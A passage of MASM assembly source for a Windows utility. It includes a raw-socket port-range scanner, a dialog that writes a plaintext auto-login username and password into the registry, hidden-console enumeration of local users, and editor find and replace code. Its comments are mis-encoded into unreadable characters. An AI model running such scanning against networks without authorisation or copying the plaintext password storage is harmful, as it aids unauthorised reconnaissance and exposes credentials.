            mov bStopRecvPacket,0
            invoke CreateThread,NULL,0,offset _recvPacket,NULL,\
                   NULL,addr @dwThreadID
            invoke CloseHandle,eax
            

            ;�������ݰ�
            ;xp��֧���Զ����ip��������ʱ��ʧ�ܷ���10004����
            invoke sendto,hPortScanSocket,addr sendBuffer,@dwIPLen,0,\
                   addr sin,sizeof sockaddr_in

            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif
            ret
_portScan   endp

;--------------------
; ѭ��ɨ��˿�
; ����ȫ�ֱ���
; dwPortScanFromIP,dwPortScanToIP,dwPortScanFromPort,dwPortScanToPort
; �м�¼��ɨ���IP�Ͷ˿ڷ�Χ
;--------------------
_portRangeScan  proc uses ebx esi edi _lParam
               local @dwTemp
               mov ecx,dwPortScanFromIP
               .while TRUE
                  .break .if dwStopScan
                  inc dwProgressValue
                  mov edx,dwPortScanFromPort
                  .while TRUE
                     .break .if dwStopScan
                     push ecx
                     push edx
                     inc dwSubProgressValue

                     mov dwCurrentPort,edx
                     invoke htonl,ecx
                     mov @dwTemp,eax
                     invoke RtlZeroMemory,addr bufDisplay,2000
                     invoke _IPtoString,@dwTemp,addr bufDisplay
                     invoke SendDlgItemMessage,hPortScanDlg,IDC_SCANSUBPROCESS,\
                            PBM_SETPOS,dwSubProgressValue,0
                     invoke SendDlgItemMessage,hPortScanDlg,IDC_SCANPROCESS,\
                            PBM_SETPOS,dwProgressValue,0

                     mov syn_timeout,10000
                     invoke _portScan

                     invoke Sleep,1
                     pop edx
                     pop ecx            
                     .break .if edx==dwPortScanToPort
                     inc edx
                  .endw
                  .break .if ecx==dwPortScanToIP
                  inc ecx
               .endw
               ret
_portRangeScan  endp

;----------------------------
; �˿�ɨ�� �ص����ں���
;----------------------------
_ProcPortScanMain  proc uses ebx edi esi hPortScanWnd:dword,uMsg:dword,\
                wParam:dword,lParam:dword
         local @port,@dwMacSize
         local @ip:dword
         local @dwFromIP,@dwToIP
         local @dwFromPort,@dwToPort
         local @dwTemp,@dwTemp1
         local @lpHostent
         local @lpszIP[20]:byte
         local @stTimeval:timeval
         local @stFdSet:fd_set
         local @line,@dwThreadID
         local @lpIP,@dwIP
         local @macAddress[8]:byte
         local @bufTemp[3]:byte
         local @saDest:in_addr


         .if uMsg==WM_NOTIFY   ;"Ӧ�ð�ť������"
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hPortScanTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwPortScanLineIndex,eax
                .endif
            .endif
         .elseif uMsg==WM_PORTSCANFINISHED  ;һ�ζ˿�ɨ�����,���½���
            ;����Ϣ��ӵ��û������
            mov esi,wParam

            invoke _ListViewSetItem,hPortScanTable,dwCount,-1,0
            mov dwCount,eax

            mov @line,0
            ;IP��ַ
            invoke RtlZeroMemory,addr szBuffer,100
            mov eax,dword ptr [esi]
            mov @dwIP,eax
            invoke inet_ntoa,eax
            mov @lpIP,eax
            invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                   @lpIP
            ;�˿�
            invoke RtlZeroMemory,addr szBuffer,100
            mov eax,dword ptr [esi+4]
            invoke ntohs,eax
            invoke wsprintf,addr szBuffer,addr szOut,eax

            inc @line
            invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                   addr szBuffer

            ;״̬
            inc @line
            mov eax,dword ptr [esi+8]
            mov dwPortStatus,eax

            .if dwPortStatus==1
                invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                             addr lpszPortStatus1
            .elseif dwPortStatus==2
                invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                             addr lpszPortStatus2
            .else
                invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                             addr lpszPortStatus3
            .endif

            ;���Դ���
            inc @line
            invoke _ListViewSetItem,hPortScanTable,dwCount,@line,\
                   addr lpszGetInfo

            ;���յ�����Ϣ                         
            inc @line
            invoke _ListViewSetItem,hChatServerTable,dwCount,@line,\
                   addr lpszOne
            inc dwCount 
         .elseif uMsg==WM_INITDIALOG  ;���ڳ�ʼ��
             ;�����Դ�������Ϊ1
             invoke SetDlgItemText,hPortScanWnd,IDC_RETRIES,addr lpszOne
             mov eax,hPortScanWnd
             mov hPortScanDlg,eax
       
             ;Ĭ��Ϊ��һ�˿ڣ�һ��˿ڻһ�
             invoke CheckDlgButton,hPortScanWnd,IDC_SINGLEPORT,BST_CHECKED
             invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMIN
             invoke EnableWindow,eax,FALSE
             invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMAX
             invoke EnableWindow,eax,FALSE
             ;��ʼ�����      
             invoke GetDlgItem,hPortScanWnd,IDC_SCANRESULT
             mov hPortScanTable,eax
             invoke SendMessage,hPortScanTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_FULLROWSELECT
             invoke ShowWindow,hPortScanTable,SW_SHOW
             invoke _clearPortScanView

             ;�����¼�����
             invoke CreateEvent,NULL,TRUE,FALSE,NULL
             mov hRecvEvent,eax

             ;invoke SetTimer,hPortScanWnd,2,50,NULL
             mov bStopRecvPacket,1

          .elseif uMsg==WM_SOCKETCLIENT  ;�Ự�ͻ�������
             mov eax,lParam
             .if ax==FD_CONNECT  ;�����������
             .elseif ax==FD_READ
               ;invoke RtlZeroMemory,addr bufRecv,1024
               ;invoke recv,hPortScanSocket,addr bufRecv,1024,0  ;ȡ�������˴���������
             .elseif ax==FD_WRITE
               invoke SetEvent,hEvent
             .elseif ax==FD_CLOSE
               ;invoke MessageBox,NULL,addr bufRecv,NULL,MB_OK
             .endif
         .elseif uMsg==WM_COMMAND
            mov eax,wParam
             .if ax==IDC_STARTSCAN      ;��ʼɨ��
               invoke _clearPortScanView
               invoke RtlZeroMemory,addr bufDisplay,2000
               ;invoke SendDlgItemMessage,hPortScanWnd,IDC_FROMIP,IPM_GETADDRESS,0,addr @ip
               invoke GetDlgItemText,hPortScanWnd,IDC_FROMIP,addr @lpszIP,20
               invoke inet_addr,addr @lpszIP
               invoke ntohl,eax
               mov @ip,eax
               mov @dwFromIP,eax

               invoke RtlZeroMemory,addr bufDisplay,2000
               ;invoke SendDlgItemMessage,hPortScanWnd,IDC_TOIP,IPM_GETADDRESS,0,addr @ip
               invoke GetDlgItemText,hPortScanWnd,IDC_TOIP,addr @lpszIP,20
               invoke inet_addr,addr @lpszIP
               invoke ntohl,eax
               mov @ip,eax
               mov @dwToIP,eax

               invoke IsDlgButtonChecked,hPortScanWnd,IDC_SINGLEPORT
               ;�����һ���˿�
               .if eax==BST_CHECKED
                   invoke GetDlgItemInt,hPortScanWnd,IDC_ESINGLEPORT,NULL,FALSE
                   mov @dwFromPort,eax
                   mov @dwToPort,eax
               ;����ж���˿�
               .else
                   invoke GetDlgItemInt,hPortScanWnd,IDC_EMULTIPORTMIN,NULL,FALSE
                   mov @dwFromPort,eax
                   invoke GetDlgItemInt,hPortScanWnd,IDC_EMULTIPORTMAX,NULL,FALSE
                   mov @dwToPort,eax
               .endif

               mov ecx,@dwToIP
               sub ecx,@dwFromIP
               inc ecx
               invoke SendDlgItemMessage,hPortScanWnd,IDC_SCANPROCESS,\
                      PBM_SETRANGE32,0,ecx
               mov dwProgressValue,0

               mov ecx,@dwToPort
               sub ecx,@dwFromPort
               inc ecx
               invoke SendDlgItemMessage,hPortScanWnd,IDC_SCANSUBPROCESS,\
                      PBM_SETRANGE32,0,ecx
               mov dwSubProgressValue,0

               invoke SendDlgItemMessage,hPortScanWnd,IDC_SCANSUBPROCESS,\
                      PBM_SETPOS,dwSubProgressValue,0
               invoke SendDlgItemMessage,hPortScanWnd,IDC_SCANPROCESS,\
                      PBM_SETPOS,dwProgressValue,0

               mov eax,@dwFromIP
               mov dwPortScanFromIP,eax
    
               mov eax,@dwToIP
               mov dwPortScanToIP,eax

               mov eax,@dwFromPort
               mov dwPortScanFromPort,eax
    
               mov eax,@dwToPort
               mov dwPortScanToPort,eax
               mov dwStopScan,0
               ;��whileѭ�����ŵ�������һ�������߳������У����ڽ������ʹ��ϵͳ��Ϣ
               invoke CreateThread,NULL,0,offset _portRangeScan,NULL,\
                   NULL,addr @dwThreadID
               invoke CloseHandle,eax

            .elseif ax==IDC_STOPSCAN   ;����ɨ��
               mov dwStopScan,1
            .elseif ax==IDC_SINGLEPORT  ;��һ�˿�

               invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMIN
               invoke EnableWindow,eax,FALSE
               invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMAX
               invoke EnableWindow,eax,FALSE

               invoke GetDlgItem,hPortScanWnd,IDC_ESINGLEPORT
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hPortScanWnd,IDC_ESINGLEPORT
               invoke SetFocus,eax               
             .elseif ax==IDC_MULTIPORT   ;һ��˿�
               invoke GetDlgItem,hPortScanWnd,IDC_ESINGLEPORT
               invoke EnableWindow,eax,FALSE

               invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMIN
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMAX
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hPortScanWnd,IDC_EMULTIPORTMIN
               invoke SetFocus,eax
             .endif
         .elseif uMsg==WM_CLOSE
           invoke EndDialog,hPortScanWnd,NULL
         .else
           mov eax,FALSE
           ret
         .endif
         mov eax,TRUE  
         ret
_ProcPortScanMain  endp

;----------------------------
; ������Ͽ��е�ѡ��������
;----------------------------
_EnableLoginOptions proc _hRegLogWnd,_dwFlag
         .if _dwFlag
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINLIST
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINUSERNAME
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINPASSWORD
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_AUTOLOGIN
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN1
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN2
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINGROUP
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN3
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINDOMAIN
            invoke EnableWindow,eax,TRUE

         .else
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINLIST
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINUSERNAME
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINPASSWORD
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_AUTOLOGIN
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN1
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN2
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINGROUP
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_STATICLOGIN3
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hRegLogWnd,IDC_LOGINDOMAIN
            invoke EnableWindow,eax,FALSE
            ;ɾ��ע�������Ӧ��ֵ
            invoke _RegSetValue,addr lpszAutoLoginKey,addr lpszDisAdminLogin,\
                   addr lpszDisableAutoLog,REG_SZ,sizeof lpszDisableAutoLog
            invoke _RegDelValue,addr lpszAutoLoginKey,addr lpszDefUser
            invoke _RegDelValue,addr lpszAutoLoginKey,addr lpszDefPassword
            invoke _RegDelValue,addr lpszAutoLoginKey,addr lpszDefDomain
         .endif
         
         ret
_EnableLoginOptions endp

;----------------------------------------
; ��һ����Ϣ�зֽ��û���
; 25+25+25+0dh ����25+25+0dh ����25+0dh
;----------------------------------------
_getUserFromLineInfo proc uses ebx ecx
         local @dwTemp

         ;invoke _MemToFile,addr lpszUserLineInfo

         invoke  RtlZeroMemory,addr lpszUser,sizeof lpszUser 
         mov ebx,0
         mov edx,0
         mov ecx,0
         .while TRUE
           @@:
           mov al,byte ptr  [lpszUserLineInfo+ebx]
           .break .if al==0

           mov byte ptr [lpszUser+edx],al
           inc edx
           inc ebx
           inc ecx
           cmp ecx,25
           jnz @B
           ;�Ѿ�����25���ֽڵ���Ҫ������û���
           ;���´���ν�25���ֽ��е��û��������������ѿո����Ϊ00h

           push edx
           push ecx
           push ebx
           push eax

           mov ebx,0
           .while TRUE
             mov al,byte ptr [lpszUser+ebx]
             .break .if al==20h
             inc ebx
           .endw
           mov byte ptr [lpszUser+ebx],0
           invoke SendMessage,hAutoLoginListBox,LB_ADDSTRING,\
                       0,addr lpszUser
           pop eax
           pop ebx
           pop ecx
           pop edx

           mov edx,0
           mov ecx,0
           jmp @B
         .endw

         ret
_getUserFromLineInfo endp

_FillUsersToList  proc uses ebx ecx
         local @szBuffer[5000]:byte
         local @szRead:DWORD
         local @userName[30]:byte
         local @usersLine[80]:byte

         invoke  _preLoad
         invoke  CreateProcess,NULL,addr szFindUserCmd,NULL,NULL,\
                 TRUE,NULL,NULL,NULL,offset stStartUp,offset stProcInfo
         .if  eax != 0
              invoke  WaitForSingleObject,stProcInfo.hProcess,INFINITE
              invoke  CloseHandle,stProcInfo.hProcess
              invoke  CloseHandle,stProcInfo.hThread
              invoke  CloseHandle,hExeFile
         .else
              invoke  MessageBox,NULL,addr szExcuteError,\
                      NULL,MB_OK or MB_ICONERROR
         .endif

         invoke  RtlZeroMemory,addr @szBuffer,sizeof @szBuffer
         invoke  CreateFile,addr szSaveFile,GENERIC_READ,FILE_SHARE_READ,\
                 NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
         mov hExeFile,eax

         invoke ReadFile,hExeFile,addr @szBuffer,sizeof @szBuffer,\
                addr @szRead,NULL
         invoke CloseHandle,hExeFile
         invoke DeleteFile,addr szSaveFile

         invoke SendMessage,hAutoLoginListBox,LB_RESETCONTENT,0,0
         ;����console.txt�ļ�����
         ;�������ĸ�0dh+0ah�����ĸ���ʾע�ͣ��ӵ��ĸ�0ah��������û���
         ;ÿ�������û�����ÿ���û����25���ֽڣ�����Ĳ��ո�
         ;����кź���ֽڣ�C3FCC1EE(������ֽ���)���������
         mov esi,0
         mov ecx,0
         mov ebx,0
         ;���ѭ�������ĸ�0ah
         .while TRUE
            @@:
            mov al,byte ptr [@szBuffer+esi]
            inc esi
            cmp al,0ah
            jnz @B
            inc ecx
            .break .if ecx==4
         .endw

         mov edi,0
         .while TRUE
            @@:
            mov al,byte ptr [@szBuffer+esi]
            .break .if al==0c3h
            mov byte ptr [lpszUserLineInfo+edi],al
            inc esi
            inc edi
            cmp al,0dh
            jnz @B
            pushf
             ;��һ����ȡ���û�����ӵ�LIST�ؼ���
             invoke _getUserFromLineInfo
             invoke  RtlZeroMemory,addr lpszUserLineInfo,sizeof lpszUserLineInfo
            popf
            mov edi,0               
            inc esi
         .endw

         and dwFlag,not F_RUNNING
         ret
_FillUsersToList  endp
;----------------------------
; ע����Զ���¼ѡ��Ի���
;----------------------------
_RegAutoLoginDlgProc  proc uses edi hRegLogWnd:dword,uMsg:dword,\
                wParam:dword,lParam:dword
         local @hKey
         local @dwValue:dword


         .if uMsg==WM_NOTIFY   ;"Ӧ�ð�ť������"
           mov edi,lParam
           assume edi:ptr PSHNOTIFY
           .if [edi].hdr.code==PSN_APPLY

           .endif
         .elseif uMsg==WM_INITDIALOG  ;�Ի����ʼ��
            mov dwDisAutoLogin,1
            invoke CheckDlgButton,hRegLogWnd,IDC_LOGINENABLED,BST_UNCHECKED
            invoke GetDlgItem,hRegLogWnd,IDC_LOGINLIST
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_LOGINUSERNAME
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_LOGINPASSWORD
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_AUTOLOGIN
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_STATICLOGIN1
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_STATICLOGIN2
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_LOGINGROUP
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_STATICLOGIN3
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,hRegLogWnd,IDC_LOGINDOMAIN
            invoke EnableWindow,eax,FALSE

            invoke GetDlgItem,hRegLogWnd,IDC_LOGINLIST
            mov hAutoLoginListBox,eax
            invoke _FillUsersToList
         .elseif uMsg==WM_COMMAND
            mov eax,wParam
             .if eax==IDC_AUTOLOGIN      ;����Ϊ�Զ���¼
               ;ʹ��
               invoke _RegSetValue,addr lpszAutoLoginKey,addr lpszDisAdminLogin,\
                      addr lpszEnableAutoLog,REG_SZ,sizeof lpszEnableAutoLog
               ;���ø�����
               ;�û���
               invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
               invoke GetDlgItemText,hRegLogWnd,IDC_LOGINUSERNAME,addr szBuffer,\
                      sizeof szBuffer
               invoke lstrlen,addr szBuffer
               invoke _RegSetValue,addr lpszAutoLoginKey,addr lpszDefUser,\
                      addr szBuffer,REG_SZ,eax
               invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
               ;����
               invoke GetDlgItemText,hRegLogWnd,IDC_LOGINPASSWORD,addr szBuffer,\
                      sizeof szBuffer
               invoke lstrlen,addr szBuffer
               invoke _RegSetValue,addr lpszAutoLoginKey,addr lpszDefPassword,\
                      addr szBuffer,REG_SZ,eax
               invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
               ;Ĭ������
               invoke GetDlgItemText,hRegLogWnd,IDC_LOGINDOMAIN,addr szBuffer,\
                      sizeof szBuffer
               invoke lstrlen,addr szBuffer
               .if eax>0
                 invoke _RegSetValue,addr lpszAutoLoginKey,addr lpszDefDomain,\
                      addr szBuffer,REG_SZ,eax
               .else
                 invoke _RegDelValue,addr lpszAutoLoginKey,addr lpszDefDomain
               .endif
               invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
               invoke EndDialog,hRegWndDlg,NULL  ;�ر�ѡ�������

             .elseif ax==IDC_LOGINLIST  ;ѡ��һ���û��Ժ��Զ�����IDC_LOGINUSERNAME
                 shr eax,16
                 .if ax==LBN_SELCHANGE
                     invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                     invoke SendMessage,hAutoLoginListBox,LB_GETCURSEL,0,0
                     invoke SendMessage,hAutoLoginListBox,LB_GETTEXT,\
                         eax,addr szBuffer
                     invoke SetDlgItemText,hRegLogWnd,IDC_LOGINUSERNAME,\
                            addr szBuffer
                     invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                 .endif
             .elseif ax==IDC_LOGINENABLED  ;�����Զ���¼������
                test  dwDisAutoLogin,F_CONSOLE
                .if  ZERO?
                   invoke CheckDlgButton,hRegLogWnd,IDC_LOGINENABLED,BST_UNCHECKED
                   invoke _EnableLoginOptions,hRegLogWnd,FALSE
                .else
                   invoke CheckDlgButton,hRegLogWnd,IDC_LOGINENABLED,BST_CHECKED
                   invoke _EnableLoginOptions,hRegLogWnd,TRUE
                .endif  
                not   dwDisAutoLogin
             .endif     
         .elseif uMsg==WM_CLOSE
           invoke DestroyWindow,hRegLogWnd
         .else
           mov eax,FALSE
           ret
         .endif
         mov eax,TRUE  
         ret
_RegAutoLoginDlgProc  endp


;----------------------------
; ע���ѡ������ڶԻ���
;----------------------------
_RegPSHDlgProc  proc  hRegWindowDlg:dword,uMsg:dword,lParam:dword
         .if uMsg==PSCB_INITIALIZED
            invoke GetWindow,hRegWindowDlg,GW_CHILD
            invoke GetWindow,eax,GW_HWNDNEXT
            invoke GetWindow,eax,GW_HWNDNEXT
            mov hApplyButton,eax  ;��ȡӦ�ð�ť�ľ��
            push hRegWindowDlg
            pop hRegWndDlg

         .else
            mov eax,TRUE
            ret
         .endif
         xor eax,eax
         ret
_RegPSHDlgProc  endp
;----------------------------------------------
; �������弰������ɫ
;----------------------------------------------
_SetFont	proc	_lpszFont,_dwFontSize,_dwColor
		local	@stCf:CHARFORMAT

		invoke	RtlZeroMemory,addr @stCf,sizeof @stCf
		mov	@stCf.cbSize,sizeof @stCf
		mov	@stCf.dwMask,CFM_SIZE or CFM_FACE or CFM_BOLD or CFM_COLOR\
                            or CFM_ITALIC or CFM_STRIKEOUT or CFM_UNDERLINE
		push	_dwFontSize
		pop	@stCf.yHeight
		push	_dwColor
		pop	@stCf.crTextColor
		mov	@stCf.dwEffects,NULL
		invoke	lstrcpy,addr @stCf.szFaceName,_lpszFont
		invoke	SendMessage,hWinEdit,EM_SETTEXTMODE,TM_PLAINTEXT,0
		invoke	SendMessage,hWinEdit,EM_SETCHARFORMAT,SCF_ALL,addr @stCf
		ret

_SetFont	endp
;-----------------------------
; ��������
;-----------------------------
_FindText	proc
		local	@stFindText:FINDTEXTEX

                ;���ò��ҷ�Χ���ӵ�ǰ��괦��ʼ�����
		invoke	SendMessage,hWinEdit,EM_EXGETSEL,0,addr @stFindText.chrg
		.if	stFind.Flags & FR_DOWN
			push	@stFindText.chrg.cpMax
			pop	@stFindText.chrg.cpMin
		.endif
		mov	@stFindText.chrg.cpMax,-1

		mov	@stFindText.lpstrText,offset szFindText
		mov	ecx,stFind.Flags
		and	ecx,FR_MATCHCASE or FR_DOWN or FR_WHOLEWORD

                ; ���Ҳ��ѹ�����õ��ҵ����ı���
		invoke	SendMessage,hWinEdit,EM_FINDTEXTEX,ecx,addr @stFindText
		.if	eax ==	-1
			mov	ecx,hWinMain
                        .if fFindReplace
                          .if     hReplaceDialog
                                mov ecx,hReplaceDialog
                          .endif
                        .else
			  .if  hFindDialog
			        mov ecx,hFindDialog
			  .endif
                        .endif
			invoke	MessageBox,ecx,addr szNotFound,NULL,MB_OK or MB_ICONINFORMATION
			ret
		.endif
		invoke	SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stFindText.chrgText
		invoke	SendMessage,hWinEdit,EM_SCROLLCARET,NULL,NULL
		ret
_FindText	endp
;-----------------------------
; �滻����
;-----------------------------
_ReplaceText    proc
                local @stFindText:FINDTEXTEX

                ;���ò��ҷ�Χ���ӵ�ǰ��괦��ʼ�����
		invoke	SendMessage,hWinEdit,EM_EXGETSEL,0,addr @stFindText.chrg
		.if	stFind.Flags & FR_DOWN
			push	@stFindText.chrg.cpMax
			pop	@stFindText.chrg.cpMin
		.endif
		mov	@stFindText.chrg.cpMax,-1

                
		mov	@stFindText.lpstrText,offset szFindText
		mov	ecx,stFind.Flags
		and	ecx,FR_MATCHCASE or FR_DOWN or FR_WHOLEWORD

                ; ���Ҳ��ѹ�����õ��ҵ����ı���
		invoke	SendMessage,hWinEdit,EM_FINDTEXTEX,ecx,addr @stFindText
		.if	eax ==	-1
			mov	ecx,hWinMain
			.if	hReplaceDialog
				mov	ecx,hReplaceDialog
			.endif
			invoke	MessageBox,ecx,addr szNotFound,NULL,MB_OK or MB_ICONINFORMATION
			ret
		.endif
		invoke	SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stFindText.chrgText
                invoke  SendMessage,hWinEdit,EM_REPLACESEL,FALSE,offset szReplaceText 
		invoke	SendMessage,hWinEdit,EM_SCROLLCARET,NULL,NULL
		ret
_ReplaceText    endp

;-----------------------------
; �滻����
;-----------------------------
_ReplaceAll     proc
             local @stFindText:FINDTEXTEX
             local @szBuffer[100]:byte
             local @lpRange:CHARRANGE

             mov dwCount,0 ;��ʼ������
             ;��λ���ļ�ͷ
             mov @lpRange.cpMin,0
             mov @lpRange.cpMax,0
             invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @lpRange

             .repeat
                ;���ò��ҷ�Χ���ӵ�ǰ��괦��ʼ�����
		invoke	SendMessage,hWinEdit,EM_EXGETSEL,0,addr @stFindText.chrg
		.if	stFind.Flags & FR_DOWN
			push	@stFindText.chrg.cpMax
			pop	@stFindText.chrg.cpMin
		.endif
		mov	@stFindText.chrg.cpMax,-1

                
		mov	@stFindText.lpstrText,offset szFindText
		mov	ecx,stFind.Flags
		and	ecx,FR_MATCHCASE or FR_DOWN or FR_WHOLEWORD
               
                ; ���Ҳ��ѹ�����õ��ҵ����ı���
		invoke	SendMessage,hWinEdit,EM_FINDTEXTEX,ecx,addr @stFindText
		.if	eax ==	-1
                        ;����滻���
                        invoke  wsprintf,addr @szBuffer,addr szFinished,dwCount
			mov	ecx,hWinMain
			.if	hReplaceDialog
				mov	ecx,hReplaceDialog
			.endif
			invoke	MessageBox,ecx,addr @szBuffer,NULL,MB_OK or MB_ICONINFORMATION
			ret
		.endif
		invoke	SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stFindText.chrgText
                invoke  SendMessage,hWinEdit,EM_REPLACESEL,FALSE,offset szReplaceText 
		invoke	SendMessage,hWinEdit,EM_SCROLLCARET,NULL,NULL
                inc dwCount
              .until FALSE
              ret
_ReplaceAll     endp

;---------------------------
; ҳ������
;---------------------------
_PageSetup	proc
		local	@stPS:PAGESETUPDLG

		invoke	RtlZeroMemory,addr @stPS,sizeof @stPS
		mov	@stPS.lStructSize,sizeof @stPS
		mov	@stPS.Flags,PSD_DISABLEMARGINS or PSD_DISABLEORIENTATION or PSD_DISABLEPAGEPAINTING
		push	hWinMain
		pop	@stPS.hwndOwner
		invoke	PageSetupDlg,addr @stPS
		ret

_PageSetup	endp
;----------------------------
; ��������
;----------------------------
_ChooseFont	proc
		local	@stCF:CHOOSEFONT

		invoke	RtlZeroMemory,addr @stCF,sizeof @stCF
		mov	@stCF.lStructSize,sizeof @stCF
		push	hWinMain
		pop	@stCF.hwndOwner
		mov	@stCF.lpLogFont,offset stLogFont
		push	dwFontColor
		pop	@stCF.rgbColors
		mov	@stCF.Flags,CF_SCREENFONTS or CF_INITTOLOGFONTSTRUCT or CF_EFFECTS
		invoke	ChooseFont,addr @stCF
		.if	eax
			push	@stCF.rgbColors
			pop	dwFontColor
			mov	eax,@stCF.iPointSize
			shl	eax,1
			invoke	_SetFont,addr stLogFont.lfFaceName,eax,@stCF.rgbColors
		.endif
		ret
_ChooseFont	endp
;----------------------------------------------
; ���ñ���ɫ
;----------------------------------------------
_ChooseColor   proc
               local @stCC:CHOOSECOLOR
              
               invoke RtlZeroMemory,addr @stCC,sizeof @stCC
               mov @stCC.lStructSize,sizeof @stCC
               push hWinMain
               pop @stCC.hWndOwner
               push dwBackColor
               pop @stCC.rgbResult
               mov @stCC.Flags,CC_RGBINIT or CC_FULLOPEN
               mov @stCC.lpCustColors,offset dwCustColors
               invoke ChooseColor,addr @stCC
               .if eax
                   push @stCC.rgbResult
                   pop dwBackColor
                   invoke SendMessage,hWinEdit,EM_SETBKGNDCOLOR,0,dwBackColor
               .endif
               ret
_ChooseColor   endp


_preLoad1       proc
                local @hFileConsole:DWORD
                mov eax,FILE_SHARE_READ or FILE_SHARE_WRITE
                push eax
                pop dwShareMode

                mov stSecurityp.nLength,NULL
                mov stSecurityp.lpSecurityDescriptor,NULL
                mov stSecurityp.bInheritHandle,NULL

                invoke  RtlZeroMemory,addr stOSVersion,sizeof stOSVersion
                mov stOSVersion.dwOSVersionInfoSize,sizeof OSVERSIONINFO
                invoke  GetVersionEx,offset stOSVersion
                .if eax
                   mov ebx,stOSVersion.dwPlatformId
                   .if ebx==VER_PLATFORM_WIN32_NT
                       mov stSecurityp.nLength,sizeof stSecurityp
                       mov stSecurityp.lpSecurityDescriptor,NULL
                       mov stSecurityp.bInheritHandle,TRUE

                       or dwShareMode,FILE_SHARE_DELETE
                   
                   .endif
                .endif   


                invoke  CreateFile,addr szSaveFile,GENERIC_WRITE or GENERIC_READ,dwShareMode,\
                         addr stSecurityp,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
                mov hFileConsole,eax

                invoke	GetStartupInfo,addr stStartUp
                mov stStartUp.dwFlags,STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
                mov eax,hFileConsole
                mov stStartUp.hStdOutput,eax
                mov stStartUp.wShowWindow,SW_HIDE
                ret
_preLoad1        endp

;---------------------------
; ���ļ��ж�ȡ���н��
;---------------------------
_getFromFile1   proc
                local @szBuffer[5000]:byte
                local @szRead:DWORD
                local @hFileConsole:DWORD

                invoke  RtlZeroMemory,addr @szBuffer,sizeof @szBuffer
                invoke  CreateFile,addr szSaveFile,GENERIC_READ,FILE_SHARE_READ,\
                        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
                mov @hFileConsole,eax

                invoke ReadFile,@hFileConsole,addr @szBuffer,sizeof @szBuffer,\
                       addr @szRead,NULL
                invoke CloseHandle,@hFileConsole
                invoke DeleteFile,addr szSaveFile
                invoke SetDlgItemText,hWinMain,ID_EDIT1,addr @szBuffer
                ret
_getFromFile1   endp
;-----------------------------------
; ���г���������szBuffer��,_dwConsole������ʾ
